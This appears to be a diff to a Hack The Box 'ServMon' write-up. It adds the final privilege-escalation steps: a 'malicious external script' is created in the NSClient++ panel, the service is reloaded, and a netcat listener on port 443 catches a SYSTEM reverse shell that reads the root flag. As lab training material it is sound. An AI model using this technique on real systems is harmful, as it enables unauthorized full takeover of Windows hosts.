@@ -598,14 +598,49 @@ nadine@SERVMON C:\Users\Nadine\Desktop>dir
 
 <br />
 
-### 2.- Create the malicious external script:
+### 2.- Create the malicious script:
 
 To do this, go to the NSClient++ panel, click on `“Settings”`, then `“External Scripts”`, followed by `“Scripts”`, and finally press `“Add new”`.
 
-Now we fill in all the required fields for the script creation:
+Now we fill in all the required fields for the script creation and click on `"Add"`:
 
 <br />
 
 ![8](../../../assets/images/Servmon/8.png)
+
+<br />
+
+### 3.- Run the malicious script:
+
+Once created, we click on "Changes" -> "Save configuration".
+
+And finally, we start the listener and reload NSClient pressing on "Control" -> "Reload".
+
+<br />
+
+```bash
+❯ sudo nc -nlvp 443
+[sudo] contraseña para theredp4nther: 
+listening on [any] 443 ...
+connect to [10.10.14.15] from (UNKNOWN) [10.10.10.184] 50033
+Microsoft Windows [Version 10.0.17763.864]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Program Files\NSClient++>whoami
+
+nt authority\system
+
+C:\Program Files\NSClient++>type \Users\Administrator\Desktop\root.txt   
+
+1f19b7089b093d81ab2b747b2dxxxxxx
+```
+
+<br />
+
+Yes! We have a shell and the root flag.
+
+One more Windows machine pwned!!
+
+Keep hacking!!❤️❤️
 
 <br />
